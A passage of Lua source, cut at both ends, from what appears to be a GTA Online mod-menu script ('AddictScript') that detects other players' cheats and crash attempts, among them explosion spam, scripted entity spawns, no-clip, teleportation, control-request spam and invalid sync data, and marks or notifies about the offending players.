				if MiscPlayerCount.NetExplosionEvent[i] ~= nil then
					if MiscPlayerCount.NetExplosionEvent[i] > 40 and not player.is_player_in_any_vehicle(i) then
						if player.is_player_valid(i) and i ~= player.player_id() then
							if not ModderDetections.ModdedExplosion.ExplosionSpam[i] then
								if not (feature["Whitelist Friends From Detections"].on and player.is_player_friend(i)) and not (feature["Whitelist Whitelisted Players From Detections"].on and not player.can_player_be_modder(i)) then
									if f.value == 0 or f.value == 2 then
										player.set_player_as_modder(i, custommodderflags["Modded Explosion"])
									end
									if f.value == 0 or f.value == 1 then
										menu.notify("Player: " .. tostring(player.get_player_name(i)) .. "\nReason: Modded Explosion | Explosion Spam", "AddictScript Modder Detection", 12, NotifyColours["orange"])
									end
									ModderDetections.ModdedExplosion.ExplosionSpam[i] = true
								end
							end
						end
					end
				end
				MiscPlayerCount.NetExplosionEvent[i] = 0
			end
			system.yield(5000)
		end
	end
	if not f.on then
		for i = 0, 31 do
			MiscPlayerCount.NetExplosionEvent[i] = 0
		end
		if eventhooks["Explosion Spam Detection"] then
			hook.remove_net_event_hook(eventhooks["Explosion Spam Detection"])
			eventhooks["Explosion Spam Detection"] = nil
		end
	end
end)
feature["Explosion Spam Detection"]:set_str_data({"Mark & Notify", "Notify", "Mark"})

localparents["Scripted Entity Spawn Detection"] = menu.add_feature("Scripted Entity Spawn", "parent", localparents["Modder Detections"].id)

feature["Peds Detection"] = menu.add_feature("Peds", "value_str", localparents["Scripted Entity Spawn Detection"].id, function(f)
	while f.on do
		if network.is_session_started() and not script_func.is_loading_into_session() and interior.get_interior_from_entity(player.get_player_ped(player.player_id())) == 0 then
			local GuiltyPlayer
			local GuiltyEntity
			local found_index = false
			local peds = ped.get_all_peds()
			for i = 1, #peds do
				if not found_index then
					if not network.has_control_of_entity(peds[i]) and not ped.is_ped_a_player(peds[i]) then
						if memory.is_script_entity(peds[i]) then
							if streaming.is_model_a_ped(entity.get_entity_model_hash(peds[i])) then
								GuiltyEntity = peds[i]
								GuiltyPlayer = memory.get_entity_owner(peds[i])
							end
						end
					end
				end
			end
			if GuiltyPlayer ~= nil and GuiltyPlayer ~= player.player_id() and GuiltyEntity ~= nil and GuiltyEntity ~= 0 then
				if player.is_player_valid(GuiltyPlayer) then
					if not ModderDetections.ScriptedEntitySpawn.Peds[GuiltyPlayer] then
						if not (feature["Whitelist Friends From Detections"].on and player.is_player_friend(GuiltyPlayer)) and not (feature["Whitelist Whitelisted Players From Detections"].on and not player.can_player_be_modder(GuiltyPlayer)) then
							if f.value == 0 or f.value == 2 then
								player.set_player_as_modder(GuiltyPlayer, custommodderflags["Scripted Entity Spawn"])
							end
							if f.value == 0 or f.value == 1 then
								menu.notify("Player: " .. tostring(player.get_player_name(GuiltyPlayer)) .. "\nReason: Scripted Entity Spawn | Ped (" .. tostring(string.format("%02x", GuiltyEntity)) .. ")", "AddictScript Modder Detection", 12, NotifyColours["orange"])
							end
							ModderDetections.ScriptedEntitySpawn.Peds[GuiltyPlayer] = true
						end
					end
				end
			end
		end
		system.yield(2000)
	end
end)
feature["Peds Detection"]:set_str_data({"Mark & Notify", "Notify", "Mark"})

feature["Vehicles Detection"] = menu.add_feature("Vehicles", "value_str", localparents["Scripted Entity Spawn Detection"].id, function(f)
	while f.on do
		if network.is_session_started() and not script_func.is_loading_into_session() and interior.get_interior_from_entity(player.get_player_ped(player.player_id())) == 0 then
			local GuiltyPlayer
			local GuiltyEntity
			local found_index = false
			local vehicles = vehicle.get_all_vehicles()
			for i = 1, #vehicles do
				if not found_index then
					if memory.is_script_entity(vehicles[i]) and not network.has_control_of_entity(vehicles[i]) and utilities.get_distance_between(player.get_player_coords(player.player_id()), vehicles[i]) < 1000 then
						if streaming.is_model_a_vehicle(entity.get_entity_model_hash(vehicles[i])) then
							GuiltyEntity = vehicles[i]
							GuiltyPlayer = memory.get_entity_owner(vehicles[i])
						end
					end
				end
			end
			if GuiltyPlayer ~= nil and GuiltyPlayer ~= player.player_id() and GuiltyEntity ~= nil and GuiltyEntity ~= 0 then
				if player.is_player_valid(GuiltyPlayer) then
					if not ModderDetections.ScriptedEntitySpawn.Vehicles[GuiltyPlayer] then
						if not (feature["Whitelist Friends From Detections"].on and player.is_player_friend(GuiltyPlayer)) and not (feature["Whitelist Whitelisted Players From Detections"].on and not player.can_player_be_modder(GuiltyPlayer)) then
							if f.value == 0 or f.value == 2 then
								player.set_player_as_modder(GuiltyPlayer, custommodderflags["Scripted Entity Spawn"])
							end
							if f.value == 0 or f.value == 1 then
								menu.notify("Player: " .. tostring(player.get_player_name(GuiltyPlayer)) .. "\nReason: Scripted Entity Spawn | Vehicle (" .. tostring(string.format("%02x", GuiltyEntity)) .. ")", "AddictScript Modder Detection", 12, NotifyColours["orange"])
							end
							ModderDetections.ScriptedEntitySpawn.Vehicles[GuiltyPlayer] = true
						end
					end
				end
			end
		end
		system.yield(2000)
	end
end)
feature["Vehicles Detection"]:set_str_data({"Mark & Notify", "Notify", "Mark"})

feature["Objects Detection"] = menu.add_feature("Objects", "value_str", localparents["Scripted Entity Spawn Detection"].id, function(f)
	if f.on then
		local exclude_object_hashes = {1005810318, 245271664, 2586970039, 918615565, 890925600, 705446731, 602296248, 4845511, 4083544953, 3604002190, 3298955569, 3148706974, 439782367, 623406777}
		local all_weapon_hashes = weapon.get_all_weapon_hashes()
		for i = 1, #all_weapon_hashes do
			exclude_object_hashes[#exclude_object_hashes + 1] = all_weapon_hashes[i]
		end
		while f.on do
			if network.is_session_started() and not script_func.is_loading_into_session() and interior.get_interior_from_entity(player.get_player_ped(player.player_id())) == 0 then
				local GuiltyPlayer
				local GuiltyEntity
				local found_index = false
				local objects = object.get_all_objects()
				for i = 1, #objects do
					if not found_index then
						local hash = entity.get_entity_model_hash(objects[i])
						if memory.is_script_entity(objects[i]) and not network.has_control_of_entity(objects[i]) then
							local is_object_excluded = false
							for a = 1, #exclude_object_hashes do
								if hash == exclude_object_hashes[a] then
									is_object_excluded = true
								end
							end
							if not is_object_excluded then
								if streaming.is_model_an_object(hash) or streaming.is_model_a_world_object(hash) then
									GuiltyEntity = objects[i]
									GuiltyPlayer = memory.get_entity_owner(objects[i])
								end
							end
						end
					end
				end
				if GuiltyPlayer ~= nil and GuiltyPlayer ~= player.player_id() and GuiltyEntity ~= nil and GuiltyEntity ~= 0 then
					if player.is_player_valid(GuiltyPlayer) then
						if not ModderDetections.ScriptedEntitySpawn.Objects[GuiltyPlayer] then
							if not (feature["Whitelist Friends From Detections"].on and player.is_player_friend(GuiltyPlayer)) and not (feature["Whitelist Whitelisted Players From Detections"].on and not player.can_player_be_modder(GuiltyPlayer)) then
								if f.value == 0 or f.value == 2 then
									player.set_player_as_modder(GuiltyPlayer, custommodderflags["Scripted Entity Spawn"])
								end
								if f.value == 0 or f.value == 1 then
									menu.notify("Player: " .. tostring(player.get_player_name(GuiltyPlayer)) .. "\nReason: Scripted Entity Spawn | Object (" .. tostring(string.format("%02x", GuiltyEntity)) .. ")", "AddictScript Modder Detection", 12, NotifyColours["orange"])
								end
								ModderDetections.ScriptedEntitySpawn.Objects[GuiltyPlayer] = true
							end
						end
					end
				end
			end
			system.yield(2000)
		end
	end
end)
feature["Objects Detection"]:set_str_data({"Mark & Notify", "Notify", "Mark"})

localparents["Bad Movement Detection"] = menu.add_feature("Bad Movement", "parent", localparents["Modder Detections"].id)

feature["No Clip Detection"] = menu.add_feature("No Clip", "value_str", localparents["Bad Movement Detection"].id, function(f)
	while f.on do
		system.yield(100)
		if network.is_session_started() and not script_func.is_loading_into_session() then
			for pid = 0, 31 do
				if player.is_player_valid(pid) and pid ~= player.player_id() then
					if entity.is_entity_visible(player.get_player_ped(pid)) and utilities.get_distance_between(player.get_player_coords(player.player_id()), player.get_player_coords(pid)) < 350 and player_func.is_player_moving(pid) and natives.GET_ENTITY_COLLISION_DISABLED(player.get_player_ped(pid)) and entity.get_entity_speed(player.get_player_ped(pid)) == 0.0 and natives.IS_PED_STILL(player.get_player_ped(pid)) and entity.get_entity_velocity(player.get_player_ped(pid)) == v3(0.0, 0.0, 0.0) and natives.GET_ENTITY_HEIGHT_ABOVE_GROUND(player.get_player_ped(pid)) > 8.0 and not player_func.is_player_in_interior(pid) and not player.is_player_in_any_vehicle(pid) and not natives.NETWORK_IS_PLAYER_FADING(pid) and not natives.IS_PED_CLIMBING(player.get_player_ped(pid)) and not natives.IS_PED_DIVING(player.get_player_ped(pid)) and not natives.IS_PED_JUMPING_OUT_OF_VEHICLE(player.get_player_ped(pid)) and not natives._IS_PED_OPENING_A_DOOR(player.get_player_ped(pid)) and not ai.is_task_active(player.get_player_ped(pid), 2) and not ai.is_task_active(player.get_player_ped(pid), 160) and not natives.IS_PED_USING_SCENARIO(player.get_player_ped(pid)) and not natives.IS_PED_IN_PARACHUTE_FREE_FALL(player.get_player_ped(pid)) and not script_func.is_player_loading(pid) then
						if not ModderDetections.BadMovement.NoClip[pid] then
							if not (feature["Whitelist Friends From Detections"].on and player.is_player_friend(pid)) and not (feature["Whitelist Whitelisted Players From Detections"].on and not player.can_player_be_modder(pid)) then
								if f.value == 0 or f.value == 2 then
									player.set_player_as_modder(pid, custommodderflags["Bad Movement"])
								end
								if f.value == 0 or f.value == 1 then
									menu.notify("Player: " .. tostring(player.get_player_name(pid)) .. "\nReason: Bad Movement | No Clip", "AddictScript Modder Detection", 12, NotifyColours["orange"])
								end
								ModderDetections.BadMovement.NoClip[pid] = true
							end
						end
					end
				end
			end
		end
	end
end)
feature["No Clip Detection"]:set_str_data({"Mark & Notify", "Notify", "Mark"})

feature["No Clip 2 Detection"] = menu.add_feature("No Clip 2", "value_str", localparents["Bad Movement Detection"].id, function(f)
	while f.on do
		system.yield(100)
		if network.is_session_started() and not script_func.is_loading_into_session() then
			for pid = 0, 31 do
				if player.is_player_valid(pid) and pid ~= player.player_id() then
					if player.is_player_in_any_vehicle(pid) then
						if entity.is_entity_visible(player.get_player_ped(pid)) and entity.is_entity_visible(player.get_player_vehicle(pid)) and player_func.is_player_moving(pid) and utilities.get_distance_between(player.get_player_coords(player.player_id()), player.get_player_coords(pid)) < 1000 and entity.get_entity_velocity(player.get_player_vehicle(pid)) == v3(0.0, 0.0, 0.0) and memory.is_entity_frozen(player.get_player_vehicle(pid)) and entity.get_entity_speed(player.get_player_vehicle(pid)) == 0.0 and interior.get_interior_from_entity(player.get_player_ped(pid)) == 0 and not natives.IS_ENTITY_A_MISSION_ENTITY(player.get_player_vehicle(pid)) and not natives.NETWORK_IS_PLAYER_FADING(pid) and not script_func.is_player_loading(pid) then
							if not ModderDetections.BadMovement.NoClip2[pid] then
								if not (feature["Whitelist Friends From Detections"].on and player.is_player_friend(pid)) and not (feature["Whitelist Whitelisted Players From Detections"].on and not player.can_player_be_modder(pid)) then
									if f.value == 0 or f.value == 2 then
										player.set_player_as_modder(pid, custommodderflags["Bad Movement"])
									end
									if f.value == 0 or f.value == 1 then
										menu.notify("Player: " .. tostring(player.get_player_name(pid)) .. "\nReason: Bad Movement | No Clip 2", "AddictScript Modder Detection", 12, NotifyColours["orange"])
									end
									ModderDetections.BadMovement.NoClip2[pid] = true
								end
							end
						end
					end
				end
			end
		end
	end
end)
feature["No Clip 2 Detection"]:set_str_data({"Mark & Notify", "Notify", "Mark"})

feature["Super Run Detection"] = menu.add_feature("Super Run", "value_str", localparents["Bad Movement Detection"].id, function(f)
	while f.on do
		system.yield(100)
		if network.is_session_started() and not script_func.is_loading_into_session() then
			for pid = 0, 31 do
				if player.is_player_valid(pid) and pid ~= player.player_id() then
					if entity.get_entity_speed(player.get_player_ped(pid)) > 56 and utilities.get_distance_between(player.get_player_coords(player.player_id()), player.get_player_coords(pid)) < 800 and natives.GET_ENTITY_HEIGHT_ABOVE_GROUND(player.get_player_ped(pid)) > 0.0 and natives.GET_ENTITY_HEIGHT_ABOVE_GROUND(player.get_player_ped(pid)) < 1.2 and not natives.IS_PED_JUMPING_OUT_OF_VEHICLE(player.get_player_ped(pid)) and not natives.IS_PED_FALLING(player.get_player_ped(pid)) and not natives.IS_PED_IN_PARACHUTE_FREE_FALL(player.get_player_ped(pid)) and player_func.is_player_moving(pid) and not ai.is_task_active(player.get_player_ped(pid), 422) and not player.is_player_in_any_vehicle(pid) and not ped.is_ped_ragdoll(player.get_player_ped(pid)) and not player_func.is_player_in_interior(pid) then
						if not ModderDetections.BadMovement.SuperRun[pid] then
							if not (feature["Whitelist Friends From Detections"].on and player.is_player_friend(pid)) and not (feature["Whitelist Whitelisted Players From Detections"].on and not player.can_player_be_modder(pid)) then
								if f.value == 0 or f.value == 2 then
									player.set_player_as_modder(pid, custommodderflags["Bad Movement"])
								end
								if f.value == 0 or f.value == 1 then
									menu.notify("Player: " .. tostring(player.get_player_name(pid)) .. "\nReason: Bad Movement | Super Run", "AddictScript Modder Detection", 12, NotifyColours["orange"])
								end
								ModderDetections.BadMovement.SuperRun[pid] = true
							end
						end
					end
				end
			end
		end
	end
end)
feature["Super Run Detection"]:set_str_data({"Mark & Notify", "Notify", "Mark"})

localparents["Failed Position Check Detection"] = menu.add_feature("Failed Position Check", "parent", localparents["Modder Detections"].id)

feature["Teleportation Detection"] = menu.add_feature("Teleportation", "value_str", localparents["Failed Position Check Detection"].id, function(f, pid)
	if f.on then
		local last_player_position = {}
		while f.on do
			system.yield(0)
			if network.is_session_started() then
				for pid = 0, 31 do
					if player.is_player_valid(pid) then
						if player.is_player_playing(pid) and not natives.IS_PED_IN_PARACHUTE_FREE_FALL(player.get_player_ped(pid)) and entity.is_entity_visible(player.get_player_ped(pid)) and not player.is_player_god(pid) and not ped.is_ped_ragdoll(player.get_player_ped(pid)) and not player.is_player_in_any_vehicle(pid) and not player_func.is_player_in_interior(pid) and not script_func.is_player_loading(pid) then
							last_player_position[pid] = player.get_player_coords(pid)
						end
					else
						last_player_position[pid] = nil
					end
				end
				system.yield(100)
				for pid = 0, 31 do
					if player.is_player_valid(pid) then
						if last_player_position[pid] ~= nil then
							if utilities.get_distance_between(v3(player.get_player_coords(pid).x, player.get_player_coords(pid).y, 100), v3(last_player_position[pid].x, last_player_position[pid].y, 100)) > 1000 and utilities.get_distance_between(player.get_player_coords(player.player_id()), player.get_player_coords(pid)) < 5000 and player.is_player_playing(pid) and not natives.IS_PED_IN_PARACHUTE_FREE_FALL(player.get_player_ped(pid)) and entity.is_entity_visible(player.get_player_ped(pid)) and not player.is_player_god(pid) and not ped.is_ped_ragdoll(player.get_player_ped(pid)) and not player.is_player_in_any_vehicle(pid) and not player_func.is_player_in_interior(pid) and not script_func.is_player_loading(pid) then
								if player.is_player_valid(pid) and pid ~= player.player_id() then
									if not ModderDetections.PositionCheck.Teleportation[pid] then
										if not (feature["Whitelist Friends From Detections"].on and player.is_player_friend(pid)) and not (feature["Whitelist Whitelisted Players From Detections"].on and not player.can_player_be_modder(pid)) then
											if f.value == 0 or f.value == 2 then
												player.set_player_as_modder(pid, custommodderflags["Failed Position Check"])
											end
											if f.value == 0 or f.value == 1 then
												menu.notify("Player: " .. tostring(player.get_player_name(pid)) .. "\nReason: Failed Position Check | Teleportation", "AddictScript Modder Detection", 12, NotifyColours["orange"])
											end
											ModderDetections.PositionCheck.Teleportation[pid] = true
										end
									end
								end
							end
						end
					end
					last_player_position[pid] = nil
				end
			end
		end
	end
end)
feature["Teleportation Detection"]:set_str_data({"Mark & Notify", "Notify", "Mark"})

localparents["World Entity Control Detection"] = menu.add_feature("World Entity Control", "parent", localparents["Modder Detections"].id)

feature["Bad Control Request Detection"] = menu.add_feature("Bad Control Request", "value_str", localparents["World Entity Control Detection"].id, function(f)
	while f.on do
		if network.is_session_started() and not script_func.is_loading_into_session() then
			if player.is_player_in_any_vehicle(player.player_id()) and player_func.is_player_driver(player.player_id()) and not ai.is_task_active(player.get_player_ped(player.player_id()), 160) and not ai.is_task_active(player.get_player_ped(player.player_id()), 152) and not natives.IS_PED_JUMPING_OUT_OF_VEHICLE(player.get_player_ped(player.player_id())) then
				local EntityOwner = memory.get_entity_owner(player.get_player_vehicle(player.player_id()))
				if EntityOwner ~= nil and EntityOwner ~= player.player_id() then
					if player.is_player_valid(EntityOwner) then
						if not ModderDetections.WorldEntityControl.BadControlRequest[EntityOwner] then
							if not (feature["Whitelist Friends From Detections"].on and player.is_player_friend(EntityOwner)) and not (feature["Whitelist Whitelisted Players From Detections"].on and not player.can_player_be_modder(EntityOwner)) then
								if f.value == 0 or f.value == 2 then
									player.set_player_as_modder(EntityOwner, custommodderflags["World Entity Control"])
								end
								if f.value == 0 or f.value == 1 then
									menu.notify("Player: " .. tostring(player.get_player_name(EntityOwner)) .. "\nReason: World Entity Control | Bad Control Request", "AddictScript Modder Detection", 12, NotifyColours["orange"])
								end
								ModderDetections.WorldEntityControl.BadControlRequest[EntityOwner] = true
							end
						end
					end
				end
			end
		end
		system.yield(500)
	end
end)
feature["Bad Control Request Detection"]:set_str_data({"Mark & Notify", "Notify", "Mark"})

feature["Request Spam Detection"] = menu.add_feature("Request Spam", "value_str", localparents["World Entity Control Detection"].id, function(f)
	if f.on then
		for i = 0, 31 do
			MiscPlayerCount.NetControlEvent[i] = 0
		end
		if eventhooks["Request Spam Detection"] == nil then
			eventhooks["Request Spam Detection"] = hook.register_net_event_hook(function(source, target, eventId)
				if eventId == NetEventID["REQUEST CONTROL"] then
					MiscPlayerCount.NetControlEvent[source] = MiscPlayerCount.NetControlEvent[source] + 1
				end
			end)
		end
		while f.on do
			for i = 0, 31 do
				if MiscPlayerCount.NetControlEvent[i] ~= nil then
					if MiscPlayerCount.NetControlEvent[i] > 40 then
						if player.is_player_valid(i) and i ~= player.player_id() then
							if not ModderDetections.WorldEntityControl.RequestSpam[i] then
								if not (feature["Whitelist Friends From Detections"].on and player.is_player_friend(i)) and not (feature["Whitelist Whitelisted Players From Detections"].on and not player.can_player_be_modder(i)) then
									if f.value == 0 or f.value == 2 then
										player.set_player_as_modder(i, custommodderflags["World Entity Control"])
									end
									if f.value == 0 or f.value == 1 then
										menu.notify("Player: " .. tostring(player.get_player_name(i)) .. "\nReason: World Entity Control | Request Spam", "AddictScript Modder Detection", 12, NotifyColours["orange"])
									end
									ModderDetections.WorldEntityControl.RequestSpam[i] = true
								end
							end
						end
					end
				end
				MiscPlayerCount.NetControlEvent[i] = 0
			end
			system.yield(5000)
		end
	end
	if not f.on then
		for i = 0, 31 do
			MiscPlayerCount.NetControlEvent[i] = 0
		end
		if eventhooks["Request Spam Detection"] then
			hook.remove_net_event_hook(eventhooks["Request Spam Detection"])
			eventhooks["Request Spam Detection"] = nil
		end
	end
end)
feature["Request Spam Detection"]:set_str_data({"Mark & Notify", "Notify", "Mark"})

localparents["Network Sync Crash Detection"] = menu.add_feature("Network Sync Crash", "parent", localparents["Modder Detections"].id)
--[[
feature["Outfit Palette 1 Detection"] = menu.add_feature("Outfit Palette 1", "value_str", localparents["Network Sync Crash Detection"].id, function(f)
	while f.on do
		if network.is_session_started() and not script_func.is_loading_into_session() then
			local GuiltyPlayer = nil
			for pid = 0, 31 do
				if player.is_player_valid(pid) and pid ~= player.player_id() then
					for comp = 0, 11 do
						if (natives.GET_PED_PALETTE_VARIATION(player.get_player_ped(pid), comp) < 0 or natives.GET_PED_PALETTE_VARIATION(player.get_player_ped(pid), comp) > 2) and interior.get_interior_from_entity(player.get_player_ped(pid)) == 0 and not player.is_player_god(pid) and player_func.is_player_moving(pid) then
							GuiltyPlayer = pid
						end
					end
				end
			end
			if GuiltyPlayer ~= nil and GuiltyPlayer ~= player.player_id() then
				if player.is_player_valid(GuiltyPlayer) then
					if not ModderDetections.NetworkSyncCrash.OutfitPalette1[GuiltyPlayer] then
						if not (feature["Whitelist Friends From Detections"].on and player.is_player_friend(GuiltyPlayer)) and not (feature["Whitelist Whitelisted Players From Detections"].on and not player.can_player_be_modder(GuiltyPlayer)) then
							if f.value == 0 or f.value == 2 then
								player.set_player_as_modder(GuiltyPlayer, custommodderflags["Network Sync Crash"])
							end
							if f.value == 0 or f.value == 1 then
								menu.notify("Player: " .. tostring(player.get_player_name(GuiltyPlayer)) .. "\nReason: Network Sync Crash | Outfit Palette 1", "AddictScript Modder Detection", 12, NotifyColours["orange"])
							end
							ModderDetections.NetworkSyncCrash.OutfitPalette1[GuiltyPlayer] = true
						end
					end
				end
			end
		end
		system.yield(2000)
	end
end)
feature["Outfit Palette 1 Detection"]:set_str_data({"Mark & Notify", "Notify", "Mark"})
]]
feature["Invalid Data 1 Detection"] = menu.add_feature("Invalid Data 1", "value_str", localparents["Network Sync Crash Detection"].id, function(f)
	while f.on do
		if network.is_session_started() and not script_func.is_loading_into_session() then
			for pid = 0, 31 do
				if player.is_player_valid(pid) and pid ~= player.player_id() then
					if player.get_player_coords(pid).x > 10700 or player.get_player_coords(pid).y > 10700 or player.get_player_coords(pid).x < -10700 or player.get_player_coords(pid).y < -10700 then
						if not ModderDetections.NetworkSyncCrash.InvalidData1[pid] then
							if not (feature["Whitelist Friends From Detections"].on and player.is_player_friend(pid)) and not (feature["Whitelist Whitelisted Players From Detections"].on and not player.can_player_be_modder(pid)) then
								if f.value == 0 or f.value == 2 then
									player.set_player_as_modder(pid, custommodderflags["Network Sync Crash"])
								end
								if f.value == 0 or f.value == 1 then
									menu.notify("Player: " .. tostring(player.get_player_name(pid)) .. "\nReason: Network Sync Crash | Invalid Data 1", "AddictScript Modder Detection", 12, NotifyColours["orange"])
								end
								ModderDetections.NetworkSyncCrash.InvalidData1[pid] = true
							end
						end
					end
				end
			end
		end
		system.yield(2000)
	end
end)
feature["Invalid Data 1 Detection"]:set_str_data({"Mark & Notify", "Notify", "Mark"})

feature["Invalid Data 2 Detection"] = menu.add_feature("Invalid Data 2", "value_str", localparents["Network Sync Crash Detection"].id, function(f)
	while f.on do
		if network.is_session_started() and not script_func.is_loading_into_session() then
			local GuiltyPlayer
			local vehicles = vehicle.get_all_vehicles()
			for i = 1, #vehicles do
				if not network.has_control_of_entity(vehicles[i]) then
					local hash = entity.get_entity_model_hash(vehicles[i])
					if hash == 956849991 or hash == 1133471123 or hash == 2803699023 or hash == 386089410 or hash == 1549009676 then
						GuiltyPlayer = memory.get_entity_owner(vehicles[i])
					end
				end
			end
			if GuiltyPlayer then
				if player.is_player_valid(GuiltyPlayer) and GuiltyPlayer ~= player.player_id() then
					if not ModderDetections.NetworkSyncCrash.InvalidData2[GuiltyPlayer] then
						if not (feature["Whitelist Friends From Detections"].on and player.is_player_friend(GuiltyPlayer)) and not (feature["Whitelist Whitelisted Players From Detections"].on and not player.can_player_be_modder(GuiltyPlayer)) then
							if f.value == 0 or f.value == 2 then
								player.set_player_as_modder(GuiltyPlayer, custommodderflags["Network Sync Crash"])
							end
							if f.value == 0 or f.value == 1 then
								menu.notify("Player: " .. tostring(player.get_player_name(GuiltyPlayer)) .. "\nReason: Network Sync Crash | Invalid Data 2", "AddictScript Modder Detection", 12, NotifyColours["orange"])
							end
							ModderDetections.NetworkSyncCrash.InvalidData2[GuiltyPlayer] = true
						end
					end
				end
			end
		end
		system.yield(2000)
	end
end)
feature["Invalid Data 2 Detection"]:set_str_data({"Mark & Notify", "Notify", "Mark"})

feature["Ped Swap 1 Detection"] = menu.add_feature("Ped Swap 1", "value_str", localparents["Network Sync Crash Detection"].id, function(f)
	while f.on do
		if network.is_session_started() and not script_func.is_loading_into_session() then
			for pid = 0, 31 do
				if player.is_player_valid(pid) and pid ~= player.player_id() then
					if player.get_player_health(pid) ~= 2600 and player.get_player_max_health(pid) ~= 2600 and not script_func.is_player_loading(pid) then
						if ((ped.get_ped_health(player.get_player_ped(pid)) > 0 and ped.get_ped_max_health(player.get_player_ped(pid)) == 0 and not entity.is_entity_dead(player.get_player_ped(pid))) or (player.get_player_health(pid) == 0.0 and player.get_player_max_health(pid) == 0.0 and not entity.is_entity_dead(player.get_player_ped(pid))) or (player.get_player_health(pid) > 328) or (player.get_player_max_health(pid) > 328) or (player.get_player_health(pid) < 0) or (player.get_player_max_health(pid) < 0) or (player.get_player_health(pid) > player.get_player_max_health(pid))) and player_func.is_player_moving(pid) and entity.is_entity_visible(player.get_player_ped(pid)) and not natives.IS_PLAYER_IN_CUTSCENE(pid) and not script_func.is_player_loading(pid) then
							if not ModderDetections.NetworkSyncCrash.PedSwap1[pid] then
								if not (feature["Whitelist Friends From Detections"].on and player.is_player_friend(pid)) and not (feature["Whitelist Whitelisted Players From Detections"].on and not player.can_player_be_modder(pid)) then
									if f.value == 0 or f.value == 2 then
										player.set_player_as_modder(pid, custommodderflags["Network Sync Crash"])
									end
									if f.value == 0 or f.value == 1 then
										menu.notify("Player: " .. tostring(player.get_player_name(pid)) .. "\nReason: Network Sync Crash | Ped Swap 1", "AddictScript Modder Detection", 12, NotifyColours["orange"])
									end
									ModderDetections.NetworkSyncCrash.PedSwap1[pid] = true
								end
							end
						end
					end
				end
			end
		end
		system.yield(2000)
	end
end)
feature["Ped Swap 1 Detection"]:set_str_data({"Mark & Notify", "Notify", "Mark"})

feature["Ped Swap 2 Detection"] = menu.add_feature("Ped Swap 2", "value_str", localparents["Network Sync Crash Detection"].id, function(f)
	while f.on do
		if network.is_session_started() and not script_func.is_loading_into_session() and interior.get_interior_from_entity(player.get_player_ped(player.player_id())) == 0 then
			local GuiltyPlayer
			local peds = ped.get_all_peds()
			for i = 1, #peds do
				if not network.has_control_of_entity(peds[i]) then
					if memory.is_script_entity(peds[i]) and not ped.is_ped_a_player(peds[i]) then
						if streaming.is_model_a_ped(entity.get_entity_model_hash(peds[i])) then
							GuiltyPlayer = memory.get_entity_owner(peds[i])
						end
					end
				end
			end
			if GuiltyPlayer ~= nil and GuiltyPlayer ~= player.player_id() then
				if player.is_player_valid(GuiltyPlayer) then
					if not ModderDetections.NetworkSyncCrash.PedSwap2[GuiltyPlayer] then
						if not (feature["Whitelist Friends From Detections"].on and player.is_player_friend(GuiltyPlayer)) and not (feature["Whitelist Whitelisted Players From Detections"].on and not player.can_player_be_modder(GuiltyPlayer)) then
							if f.value == 0 or f.value == 2 then
								player.set_player_as_modder(GuiltyPlayer, custommodderflags["Network Sync Crash"])
							end
							if f.value == 0 or f.value == 1 then
								menu.notify("Player: " .. tostring(player.get_player_name(GuiltyPlayer)) .. "\nReason: Network Sync Crash | Ped Swap 2", "AddictScript Modder Detection", 12, NotifyColours["orange"])
							end
							ModderDetections.NetworkSyncCrash.PedSwap2[GuiltyPlayer] = true
						end
					end
				end
			end
		end
		system.yield(2000)
	end
end)
feature["Ped Swap 2 Detection"]:set_str_data({"Mark & Notify", "Notify", "Mark"})

feature["Bad Head Blend Data Detection"] = menu.add_feature("Bad Head Blend Data", "value_str", localparents["Network Sync Crash Detection"].id, function(f)
	while f.on do
		if network.is_session_started() and not script_func.is_loading_into_session() then
			for pid = 0, 31 do
				if player.is_player_valid(pid) and pid ~= player.player_id() then
					local Guilty = false
					local headblend_dict = ped.get_ped_head_blend_data(player.get_player_ped(pid))
					if headblend_dict ~= nil then
						for k, v in pairs(headblend_dict) do
							if headblend_dict[k] < 0 or headblend_dict[k] > 100 then
								Guilty = true
							end
						end
					end
					if Guilty then
						if not ModderDetections.NetworkSyncCrash.BadHeadBlendData[pid] then
							if not (feature["Whitelist Friends From Detections"].on and player.is_player_friend(pid)) and not (feature["Whitelist Whitelisted Players From Detections"].on and not player.can_player_be_modder(pid)) then
								if f.value == 0 or f.value == 2 then
									player.set_player_as_modder(pid, custommodderflags["Network Sync Crash"])
								end
								if f.value == 0 or f.value == 1 then
									menu.notify("Player: " .. tostring(player.get_player_name(pid)) .. "\nReason: Network Sync Crash | Bad Head Blend Data", "AddictScript Modder Detection", 12, NotifyColours["orange"])
								end
								ModderDetections.NetworkSyncCrash.BadHeadBlendData[pid] = true
							end
						end
					end
				end
			end
		end
		system.yield(2000)
	end
end)
feature["Bad Head Blend Data Detection"]:set_str_data({"Mark & Notify", "Notify", "Mark"})

feature["Model Change Crash Detection"] = menu.add_feature("Model Change Crash", "value_str", localparents["Network Sync Crash Detection"].id, function(f)
	while f.on do
		if network.is_session_started() and not script_func.is_loading_into_session() then
			for pid = 0, 31 do
				if player.is_player_valid(pid) and pid ~= player.player_id() then
					if entity.get_entity_model_hash(player.get_player_ped(pid)) ~= gameplay.get_hash_key("mp_f_freemode_01") and entity.get_entity_model_hash(player.get_player_ped(pid)) ~= gameplay.get_hash_key("mp_m_freemode_01") and entity.get_entity_model_hash(player.get_player_ped(pid)) ~= 0 then
						if not ModderDetections.NetworkSyncCrash.ModelChangeCrash[pid] then
							if not (feature["Whitelist Friends From Detections"].on and player.is_player_friend(pid)) and not (feature["Whitelist Whitelisted Players From Detections"].on and not player.can_player_be_modder(pid)) then
								if f.value == 0 or f.value == 2 then
									player.set_player_as_modder(pid, custommodderflags["Network Sync Crash"])
								end
								if f.value == 0 or f.value == 1 then
									menu.notify("Player: " .. tostring(player.get_player_name(pid)) .. "\nReason: Network Sync Crash | Model Change Crash", "AddictScript Modder Detection", 12, NotifyColours["orange"])
								end
								ModderDetections.NetworkSyncCrash.ModelChangeCrash[pid] = true
							end
						end
					end
				end
			end
		end
		system.yield(2000)
	end
end)
feature["Model Change Crash Detection"]:set_str_data({"Mark & Notify", "Notify", "Mark"})

feature["Ped Component 1 Detection"] = menu.add_feature("Ped Component 1", "value_str", localparents["Network Sync Crash Detection"].id, function(f)
	while f.on do
		if network.is_session_started() and not script_func.is_loading_into_session() and interior.get_interior_from_entity(player.get_player_ped(player.player_id())) == 0 then
			local GuiltyPlayer
			local peds = ped.get_all_peds()
			for i = 1, #peds do
				if not network.has_control_of_entity(peds[i]) then
					for comp = 0, 11 do
